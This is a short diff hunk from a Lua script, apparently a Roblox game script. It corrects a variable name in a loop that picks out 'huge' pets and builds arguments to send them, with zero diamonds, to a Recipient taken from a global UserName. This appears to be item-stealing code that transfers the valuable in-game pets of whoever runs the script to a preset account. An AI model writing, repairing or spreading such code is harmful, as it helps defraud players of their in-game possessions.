@@ -287,7 +287,7 @@ while wait() do
 		if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value < 1000000 then
 			local args = {
 				[1] = {
-					Recipient = G_UserName,
+					Recipient = _G.UserName,
 					Diamonds = 0,
 					Pets = {
 						v.uid
